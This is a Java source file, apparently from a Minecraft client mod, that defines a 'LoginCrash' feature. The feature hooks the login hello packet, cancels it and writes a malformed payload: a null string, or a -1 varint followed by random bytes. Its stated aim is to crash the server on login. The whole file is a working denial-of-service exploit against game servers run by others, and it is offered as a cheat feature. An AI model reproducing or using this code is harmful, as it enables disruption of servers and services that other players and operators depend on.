package me.dustin.crash.feature;

import me.dustin.crash.event.EventWriteLoginHelloPacket;
import me.dustin.events.core.EventListener;
import me.dustin.events.core.annotate.EventPointer;
import me.dustin.jex.feature.mod.core.Feature;
import me.dustin.jex.feature.option.annotate.Op;

import java.util.Random;

@Feature.Manifest(category = Feature.Category.MISC, description = "Tries to crash the server on login using null packets. (By 0x150)")
public class LoginCrash extends Feature {

    @Op(name = "Mode", all = {"Normal", "Test"})
    public String mode = "Normal";

    public LoginCrash() {
        super();
        setFeatureCategory(Category.valueOf("CRASH"));
    }

    @EventPointer
    private final EventListener<EventWriteLoginHelloPacket> eventWriteLoginHelloPacketEventListener = new EventListener<>(eventWriteLoginHelloPacket -> {
        toggleState();
        eventWriteLoginHelloPacket.cancel();
        switch (mode.toLowerCase()) {
            case "normal" -> eventWriteLoginHelloPacket.getPacketByteBuf().writeString(null);
            case "test" -> {
                byte[] bytes = new byte[256];
                new Random().nextBytes(bytes);
                eventWriteLoginHelloPacket.getPacketByteBuf().writeVarInt(-1);
                eventWriteLoginHelloPacket.getPacketByteBuf().writeBytes(bytes);
            }
        }
    });

}
